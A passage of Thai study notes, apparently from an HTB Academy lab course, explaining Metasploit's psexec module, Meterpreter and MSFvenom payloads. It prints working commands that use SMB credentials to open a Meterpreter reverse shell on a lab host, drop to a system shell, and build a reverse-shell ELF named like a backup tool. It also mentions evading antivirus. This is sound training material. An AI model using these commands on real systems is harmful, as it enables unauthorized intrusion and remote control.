**‡∏Å‡∏≤‡∏£‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå:**

| ‡∏™‡πà‡∏ß‡∏ô | ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢ |
|------|----------|
| **56** | ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏•‡∏Ç module ‡πÉ‡∏ô‡∏ï‡∏≤‡∏£‡∏≤‡∏á‡∏ú‡∏•‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ (‡πÉ‡∏ä‡πâ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏•‡∏∑‡∏≠‡∏Å module: `use 56`) |
| **exploit/** | ‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó module = exploit module (‡∏°‡∏µ payload ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏™‡∏£‡πâ‡∏≤‡∏á shell session) |
| **windows/** | ‡πÅ‡∏û‡∏•‡∏ï‡∏ü‡∏≠‡∏£‡πå‡∏°‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ = Windows |
| **smb/** | ‡∏ö‡∏£‡∏¥‡∏Å‡∏≤‡∏£‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÇ‡∏à‡∏°‡∏ï‡∏µ = SMB |
| **psexec** | ‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏ó‡∏µ‡πà‡∏à‡∏∞‡∏≠‡∏±‡∏õ‡πÇ‡∏´‡∏•‡∏î‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡∏£‡∏∞‡∏ö‡∏ö‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ |

**‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏:** ‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏•‡∏Ç module ‡∏≠‡∏≤‡∏à‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÑ‡∏õ‡∏ï‡∏≤‡∏°‡∏Å‡∏≤‡∏£‡∏Ñ‡πâ‡∏ô‡∏´‡∏≤ ‡πÑ‡∏°‡πà‡∏Ñ‡∏ß‡∏£‡∏à‡∏î‡∏à‡∏≥‡πÄ‡∏õ‡πá‡∏ô‡∏Ñ‡πà‡∏≤‡∏Ñ‡∏á‡∏ó‡∏µ‡πà

---

## ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô Module: PsExec

### ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å Module

```bash
msf6 > use 56
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

**‡∏Å‡∏≤‡∏£‡πÄ‡∏õ‡∏•‡∏µ‡πà‡∏¢‡∏ô‡πÅ‡∏õ‡∏•‡∏á Prompt:**
- ‡πÅ‡∏™‡∏î‡∏á `exploit(windows/smb/psexec)` = ‡∏Å‡∏≥‡∏•‡∏±‡∏á‡πÉ‡∏ä‡πâ exploit ‡∏ô‡∏µ‡πâ
- Payload ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô: `windows/meterpreter/reverse_tcp`

### ‡∏î‡∏π Options ‡∏Ç‡∏≠‡∏á Module

```bash
msf6 exploit(windows/smb/psexec) > options
```

**Module Options:**

| Option | Current Setting | Required | Description |
|--------|----------------|----------|-------------|
| **RHOSTS** | - | yes | ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢ (IP address, CIDR, ‡∏´‡∏£‡∏∑‡∏≠ hosts file) |
| **RPORT** | 445 | yes | SMB service port |
| **SHARE** | - | no | Share ‡∏ó‡∏µ‡πà‡∏à‡∏∞‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ (ADMIN$, C$, ‡∏Ø‡∏•‡∏Ø) |
| **SMBDomain** | . | no | Windows domain ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö authentication |
| **SMBPass** | - | no | Password |
| **SMBUser** | - | no | Username |

**Payload Options (Meterpreter):**

| Option | Current Setting | Required | Description |
|--------|----------------|----------|-------------|
| **EXITFUNC** | thread | yes | ‡∏ß‡∏¥‡∏ò‡∏µ‡∏≠‡∏≠‡∏Å‡∏à‡∏≤‡∏Å payload |
| **LHOST** | 68.183.42.102 | yes | IP ‡∏Ç‡∏≠‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏ó‡∏µ‡πà‡∏£‡∏≠‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ |
| **LPORT** | 4444 | yes | Port ‡∏ó‡∏µ‡πà‡∏£‡∏≠‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠ |

### Meterpreter ‡∏Ñ‡∏∑‡∏≠‡∏≠‡∏∞‡πÑ‡∏£?

**Meterpreter** = Payload ‡∏û‡∏¥‡πÄ‡∏®‡∏©‡∏ó‡∏µ‡πà‡πÉ‡∏´‡πâ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤ raw TCP reverse shell

**‡∏Ñ‡∏∏‡∏ì‡∏™‡∏°‡∏ö‡∏±‡∏ï‡∏¥:**
- ‡πÉ‡∏ä‡πâ **in-memory DLL injection** = ‡πÅ‡∏≠‡∏ö‡πÅ‡∏ù‡∏á‡∏°‡∏≤‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô
- ‡∏™‡∏£‡πâ‡∏≤‡∏á communication channel ‡∏£‡∏∞‡∏´‡∏ß‡πà‡∏≤‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏Å‡∏±‡∏ö‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- ‡πÄ‡∏õ‡πá‡∏ô default payload ‡πÉ‡∏ô Metasploit

**‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ:**
- ‡∏≠‡∏±‡∏õ‡πÇ‡∏´‡∏•‡∏î/‡∏î‡∏≤‡∏ß‡∏ô‡πå‡πÇ‡∏´‡∏•‡∏î‡πÑ‡∏ü‡∏•‡πå
- ‡∏£‡∏±‡∏ô‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏£‡∏∞‡∏ö‡∏ö
- ‡πÉ‡∏ä‡πâ keylogger
- ‡∏™‡∏£‡πâ‡∏≤‡∏á/‡πÄ‡∏£‡∏¥‡πà‡∏°/‡∏´‡∏¢‡∏∏‡∏î services
- ‡∏à‡∏±‡∏î‡∏Å‡∏≤‡∏£ processes
- ‡πÅ‡∏•‡∏∞‡∏≠‡∏∑‡πà‡∏ô‡πÜ ‡∏≠‡∏µ‡∏Å‡∏°‡∏≤‡∏Å

---

## ‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡πÅ‡∏•‡∏∞‡∏£‡∏±‡∏ô Exploit

### ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤ Options

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71

msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$

msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!

msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student

msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

**‡∏Å‡∏≤‡∏£‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡πÄ‡∏´‡∏•‡πà‡∏≤‡∏ô‡∏µ‡πâ:**
- **RHOSTS:** IP ‡∏Ç‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- **SHARE:** ‡πÉ‡∏ä‡πâ administrative share (ADMIN$)
- **SMBPass & SMBUser:** credentials ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á
- **LHOST:** IP ‡∏Ç‡∏≠‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ (VPN tunnel IP ‡∏´‡∏£‡∏∑‡∏≠ interface ID)

### ‡∏£‡∏±‡∏ô Exploit

```bash
msf6 exploit(windows/smb/psexec) > exploit
```

**Output ‡∏ó‡∏µ‡πà‡πÑ‡∏î‡πâ:**
```
[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675)

meterpreter > 
```

### ‡∏Å‡∏≤‡∏£‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå Output:

**‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô:**
1. ‚úÖ ‡πÄ‡∏£‡∏¥‡πà‡∏° reverse TCP handler
2. ‚úÖ ‡πÄ‡∏ä‡∏∑‡πà‡∏≠‡∏°‡∏ï‡πà‡∏≠‡∏Å‡∏±‡∏ö server
3. ‚úÖ ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå‡∏î‡πâ‡∏ß‡∏¢ credentials
4. ‚úÖ ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å PowerShell target
5. ‚úÖ ‡∏£‡∏±‡∏ô payload
6. ‚úÖ ‡∏™‡πà‡∏á stage (175,174 bytes)
7. ‚úÖ **‡∏™‡∏≥‡πÄ‡∏£‡πá‡∏à!** ‡πÑ‡∏î‡πâ Meterpreter session

---

## ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô Meterpreter Shell

### ‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏û‡∏∑‡πâ‡∏ô‡∏ê‡∏≤‡∏ô

```bash
meterpreter > ?
```
- ‡πÅ‡∏™‡∏î‡∏á‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏ó‡∏µ‡πà‡πÉ‡∏ä‡πâ‡πÑ‡∏î‡πâ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î

### Drop ‡πÑ‡∏õ‡∏¢‡∏±‡∏á System-Level Shell

```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

**‡πÄ‡∏´‡∏ï‡∏∏‡∏ú‡∏•‡∏ó‡∏µ‡πà‡∏ï‡πâ‡∏≠‡∏á drop ‡πÑ‡∏õ‡∏¢‡∏±‡∏á system shell:**
- Meterpreter ‡∏°‡∏µ‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏ö‡∏≤‡∏á‡∏≠‡∏¢‡πà‡∏≤‡∏á
- System shell ‡πÉ‡∏´‡πâ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á‡∏£‡∏∞‡∏ö‡∏ö‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î
- ‡∏Ñ‡∏•‡πâ‡∏≤‡∏¢‡∏Å‡∏±‡∏ö command language interpreters ‡∏≠‡∏∑‡πà‡∏ô‡πÜ (Bash, PowerShell, ksh)

---

## ‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á PsExec Module

‡∏ï‡∏≤‡∏°‡πÄ‡∏≠‡∏Å‡∏™‡∏≤‡∏£ Rapid7 Module Documentation:

**‡πÇ‡∏°‡∏î‡∏π‡∏•‡∏ô‡∏µ‡πâ:**
- ‡πÉ‡∏ä‡πâ **username ‡πÅ‡∏•‡∏∞ password ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á‡∏Ç‡∏≠‡∏á administrator** (‡∏´‡∏£‡∏∑‡∏≠ password hash)
- ‡∏£‡∏±‡∏ô arbitrary payload ‡∏ö‡∏ô‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
- ‡∏Ñ‡∏•‡πâ‡∏≤‡∏¢‡∏Å‡∏±‡∏ö **"psexec" utility** ‡∏Ç‡∏≠‡∏á SysInternals
- **‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏•‡∏ö‡∏£‡πà‡∏≠‡∏á‡∏£‡∏≠‡∏¢‡∏ï‡∏±‡∏ß‡πÄ‡∏≠‡∏á‡πÑ‡∏î‡πâ**
- ‡∏™‡∏£‡πâ‡∏≤‡∏á service ‡∏î‡πâ‡∏ß‡∏¢‡∏ä‡∏∑‡πà‡∏≠‡πÅ‡∏•‡∏∞‡∏Ñ‡∏≥‡∏≠‡∏ò‡∏¥‡∏ö‡∏≤‡∏¢‡πÅ‡∏ö‡∏ö‡∏™‡∏∏‡πà‡∏°

---
# Crafting Payloads with MSFvenom

## ‡∏Ç‡πâ‡∏≠‡∏à‡∏≥‡∏Å‡∏±‡∏î‡∏Ç‡∏≠‡∏á Metasploit ‡πÅ‡∏•‡∏∞‡∏ó‡∏≤‡∏á‡∏≠‡∏≠‡∏Å

### ‡∏õ‡∏±‡∏ç‡∏´‡∏≤‡∏ó‡∏µ‡πà‡∏û‡∏ö:

**‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ Metasploit ‡πÅ‡∏ö‡∏ö‡∏≠‡∏±‡∏ï‡πÇ‡∏ô‡∏°‡∏±‡∏ï‡∏¥‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£:**
- ‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢‡∏ú‡πà‡∏≤‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢
- ‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏†‡∏≤‡∏¢‡πÉ‡∏ô (internal network)
- ‡∏°‡∏µ network routes ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡∏ó‡∏µ‡πà‡∏°‡∏µ‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢

**‡∏™‡∏ñ‡∏≤‡∏ô‡∏Å‡∏≤‡∏£‡∏ì‡πå‡∏ó‡∏µ‡πà‡∏°‡∏µ‡∏õ‡∏±‡∏ç‡∏´‡∏≤:**
‡πÄ‡∏°‡∏∑‡πà‡∏≠**‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Å‡∏≤‡∏£‡πÄ‡∏Ç‡πâ‡∏≤‡∏ñ‡∏∂‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡∏≠‡∏Ç‡πà‡∏≤‡∏¢‡πÇ‡∏î‡∏¢‡∏ï‡∏£‡∏á**‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢

### ‡∏ß‡∏¥‡∏ò‡∏µ‡πÅ‡∏Å‡πâ‡∏õ‡∏±‡∏ç‡∏´‡∏≤: MSFvenom

**MSFvenom** = ‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏™‡∏£‡πâ‡∏≤‡∏á payload ‡∏ó‡∏µ‡πà:
- ‡∏™‡∏£‡πâ‡∏≤‡∏á payload ‡πÅ‡∏¢‡∏Å‡∏à‡∏≤‡∏Å Metasploit
- ‡∏™‡πà‡∏á‡∏ú‡πà‡∏≤‡∏ô‡∏ä‡πà‡∏≠‡∏á‡∏ó‡∏≤‡∏á‡∏≠‡∏∑‡πà‡∏ô (email, social engineering, ‡∏Ø‡∏•‡∏Ø)
- **Encrypt & Encode payload** ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏•‡∏ö‡∏´‡∏•‡∏µ‡∏Å anti-virus

---

## ‡∏Å‡∏≤‡∏£‡πÉ‡∏ä‡πâ‡∏á‡∏≤‡∏ô MSFvenom

### ‡∏î‡∏π‡∏£‡∏≤‡∏¢‡∏Å‡∏≤‡∏£ Payloads ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î

```bash
msfvenom -l payloads
```

**Output:**
```
Framework Payloads (592 total) [--payload <value>]

Name                                                Description
----                                                -----------
linux/x86/shell/reverse_tcp                         Spawn a command shell (staged). Connect back to attacker
linux/x86/shell_bind_tcp                            Listen for a connection and spawn a command shell
linux/x86/shell_reverse_tcp                         Connect back to attacker and spawn a command shell
linux/zarch/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
windows/dllinject/reverse_tcp                       Inject a DLL via a reflective loader. Connect back to attacker
windows/meterpreter/reverse_tcp                     Meterpreter payload (staged)
windows/meterpreter_reverse_tcp                     Meterpreter payload (stageless)
```

### ‡∏™‡∏¥‡πà‡∏á‡∏ó‡∏µ‡πà‡∏™‡∏±‡∏á‡πÄ‡∏Å‡∏ï‡πÑ‡∏î‡πâ:

**1. Naming Convention:**
- ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏ï‡πâ‡∏ô‡∏î‡πâ‡∏ß‡∏¢ **OS ‡∏Ç‡∏≠‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢** (Linux, Windows, MacOS, mainframe, ‡∏Ø‡∏•‡∏Ø)
- ‡πÅ‡∏™‡∏î‡∏á‡∏õ‡∏£‡∏∞‡πÄ‡∏†‡∏ó: **(staged)** ‡∏´‡∏£‡∏∑‡∏≠ **(stageless)**

**2. Architecture:**
- x86, x64, ARM, ‡∏Ø‡∏•‡∏Ø

**3. Shell Type:**
- shell, meterpreter, ‡∏Ø‡∏•‡∏Ø

**4. Connection Type:**
- reverse_tcp, bind_tcp, reverse_http, ‡∏Ø‡∏•‡∏Ø

---

## Staged vs. Stageless Payloads

### Staged Payloads (‡∏°‡∏µ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô)

**‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:** `linux/x86/shell/reverse_tcp`

**‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô:**
1. ‡∏™‡πà‡∏á **stage ‡πÅ‡∏£‡∏Å (‡∏Ç‡∏ô‡∏≤‡∏î‡πÄ‡∏•‡πá‡∏Å)** ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
2. Stage ‡πÅ‡∏£‡∏Å‡∏ñ‡∏π‡∏Å‡∏£‡∏±‡∏ô‡∏ö‡∏ô‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢
3. **Call back** ‡πÑ‡∏õ‡∏¢‡∏±‡∏á‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏≤‡∏ß‡∏ô‡πå‡πÇ‡∏´‡∏•‡∏î payload ‡∏ó‡∏µ‡πà‡πÄ‡∏´‡∏•‡∏∑‡∏≠
4. ‡∏£‡∏±‡∏ô shellcode ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏™‡∏£‡πâ‡∏≤‡∏á reverse shell

**‡∏Ç‡πâ‡∏≠‡∏î‡∏µ:**
- ‡∏™‡πà‡∏á payload ‡∏Ç‡∏ô‡∏≤‡∏î‡πÉ‡∏´‡∏ç‡πà‡πÅ‡∏ö‡∏ö‡πÅ‡∏ö‡πà‡∏á‡∏™‡πà‡∏ß‡∏ô‡πÑ‡∏î‡πâ
- ‡∏¢‡∏∑‡∏î‡∏´‡∏¢‡∏∏‡πà‡∏ô‡πÉ‡∏ô‡∏Å‡∏≤‡∏£‡∏™‡πà‡∏á component ‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°

**‡∏Ç‡πâ‡∏≠‡πÄ‡∏™‡∏µ‡∏¢:**
- Stage ‡∏Å‡∏¥‡∏ô memory space
- ‡∏ï‡πâ‡∏≠‡∏á‡∏Å‡∏≤‡∏£ bandwidth ‡∏°‡∏≤‡∏Å‡∏Å‡∏ß‡πà‡∏≤
- ‡∏≠‡∏≤‡∏à‡πÑ‡∏°‡πà‡πÄ‡∏™‡∏ñ‡∏µ‡∏¢‡∏£‡πÉ‡∏ô‡∏™‡∏†‡∏≤‡∏û‡πÅ‡∏ß‡∏î‡∏•‡πâ‡∏≠‡∏°‡∏ó‡∏µ‡πà‡∏°‡∏µ latency ‡∏™‡∏π‡∏á
- ‡∏™‡∏£‡πâ‡∏≤‡∏á network traffic ‡∏°‡∏≤‡∏Å‡∏Ç‡∏∂‡πâ‡∏ô (‡∏á‡πà‡∏≤‡∏¢‡∏ï‡πà‡∏≠‡∏Å‡∏≤‡∏£‡∏ï‡∏£‡∏ß‡∏à‡∏à‡∏±‡∏ö)

### Stageless Payloads (‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô)

**‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á:** `linux/zarch/meterpreter_reverse_tcp`

**‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô:**
1. ‡∏™‡πà‡∏á **payload ‡∏ó‡∏±‡πâ‡∏á‡∏´‡∏°‡∏î** ‡πÑ‡∏õ‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏Å‡∏±‡∏ô‡∏Ñ‡∏£‡∏±‡πâ‡∏á‡πÄ‡∏î‡∏µ‡∏¢‡∏ß
2. ‡πÑ‡∏°‡πà‡∏°‡∏µ‡∏Å‡∏≤‡∏£ call back ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏î‡∏≤‡∏ß‡∏ô‡πå‡πÇ‡∏´‡∏•‡∏î‡πÄ‡∏û‡∏¥‡πà‡∏°‡πÄ‡∏ï‡∏¥‡∏°
3. ‡∏£‡∏±‡∏ô‡∏ó‡∏±‡∏ô‡∏ó‡∏µ‡πÄ‡∏°‡∏∑‡πà‡∏≠‡πÑ‡∏î‡πâ‡∏£‡∏±‡∏ö

**‡∏Ç‡πâ‡∏≠‡∏î‡∏µ:**
- ‡πÄ‡∏´‡∏°‡∏≤‡∏∞‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏™‡∏†‡∏≤‡∏û‡πÅ‡∏ß‡∏î‡∏•‡πâ‡∏≠‡∏°‡∏ó‡∏µ‡πà bandwidth ‡∏à‡∏≥‡∏Å‡∏±‡∏î
- ‡πÄ‡∏™‡∏ñ‡∏µ‡∏¢‡∏£‡∏Å‡∏ß‡πà‡∏≤‡πÉ‡∏ô environment ‡∏ó‡∏µ‡πà‡∏°‡∏µ latency
- **‡∏î‡∏µ‡∏Å‡∏ß‡πà‡∏≤‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏´‡∏•‡∏ö‡∏´‡∏•‡∏µ‡∏Å (evasion)**
- network traffic ‡∏ô‡πâ‡∏≠‡∏¢‡∏Å‡∏ß‡πà‡∏≤
- ‡πÄ‡∏´‡∏°‡∏≤‡∏∞‡∏Å‡∏±‡∏ö social engineering

**‡∏Ç‡πâ‡∏≠‡πÄ‡∏™‡∏µ‡∏¢:**
- ‡∏Ç‡∏ô‡∏≤‡∏î‡πÑ‡∏ü‡∏•‡πå‡πÉ‡∏´‡∏ç‡πà‡∏Å‡∏ß‡πà‡∏≤

---

## ‡∏Å‡∏≤‡∏£‡∏£‡∏∞‡∏ö‡∏∏‡∏ä‡∏ô‡∏¥‡∏î Payload ‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠

### ‡∏ß‡∏¥‡∏ò‡∏µ‡∏î‡∏π‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠:

**Staged Payload:**
```
linux/x86/shell/reverse_tcp
         ‚Üë     ‚Üë     ‚Üë
      arch  stage  stage
```
- ‡πÅ‡∏ï‡πà‡∏•‡∏∞ `/` ‡πÅ‡∏ó‡∏ô‡∏Ç‡∏±‡πâ‡∏ô‡∏ï‡∏≠‡∏ô (stage)
- `/shell/` = stage ‡∏´‡∏ô‡∏∂‡πà‡∏á
- `/reverse_tcp` = ‡∏≠‡∏µ‡∏Å stage ‡∏´‡∏ô‡∏∂‡πà‡∏á

**Stageless Payload:**
```
linux/zarch/meterpreter_reverse_tcp
         ‚Üë            ‚Üë
      arch    shell+connection ‡∏£‡∏ß‡∏°‡∏Å‡∏±‡∏ô
```
- ‡∏ó‡∏∏‡∏Å‡∏≠‡∏¢‡πà‡∏≤‡∏á‡∏≠‡∏¢‡∏π‡πà‡πÉ‡∏ô‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡πÄ‡∏î‡∏µ‡∏¢‡∏ß
- `meterpreter_reverse_tcp` = shell ‡πÅ‡∏•‡∏∞ network communication ‡∏£‡∏ß‡∏°‡∏Å‡∏±‡∏ô

### ‡∏ï‡∏±‡∏ß‡∏≠‡∏¢‡πà‡∏≤‡∏á‡πÄ‡∏õ‡∏£‡∏µ‡∏¢‡∏ö‡πÄ‡∏ó‡∏µ‡∏¢‡∏ö:

| Staged | Stageless |
|--------|-----------|
| `windows/meterpreter/reverse_tcp` | `windows/meterpreter_reverse_tcp` |
| ‡∏°‡∏µ `/` ‡πÅ‡∏¢‡∏Å stage | ‡πÑ‡∏°‡πà‡∏°‡∏µ `/` ‡πÅ‡∏¢‡∏Å - ‡πÉ‡∏ä‡πâ `_` |

**‡∏´‡∏°‡∏≤‡∏¢‡πÄ‡∏´‡∏ï‡∏∏:** ‡∏ñ‡πâ‡∏≤‡πÑ‡∏°‡πà‡πÅ‡∏ô‡πà‡πÉ‡∏à‡∏à‡∏≤‡∏Å‡∏ä‡∏∑‡πà‡∏≠ ‡πÉ‡∏´‡πâ‡∏î‡∏π description ‡∏Ç‡∏≠‡∏á payload ‡∏à‡∏∞‡∏ö‡∏≠‡∏Å‡∏ß‡πà‡∏≤ staged ‡∏´‡∏£‡∏∑‡∏≠ stageless

---

## ‡∏™‡∏£‡πâ‡∏≤‡∏á Stageless Payload ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö Linux

### ‡∏™‡∏£‡πâ‡∏≤‡∏á Payload

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

**Output:**
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

### ‡∏Å‡∏≤‡∏£‡πÅ‡∏¢‡∏Å‡∏ß‡∏¥‡πÄ‡∏Ñ‡∏£‡∏≤‡∏∞‡∏´‡πå‡∏Ñ‡∏≥‡∏™‡∏±‡πà‡∏á:

| ‡∏™‡πà‡∏ß‡∏ô | ‡∏Ñ‡∏ß‡∏≤‡∏°‡∏´‡∏°‡∏≤‡∏¢ |
|------|----------|
| `msfvenom` | ‡πÄ‡∏Ñ‡∏£‡∏∑‡πà‡∏≠‡∏á‡∏°‡∏∑‡∏≠‡∏™‡∏£‡πâ‡∏≤‡∏á payload |
| `-p` | ‡∏™‡∏£‡πâ‡∏≤‡∏á payload |
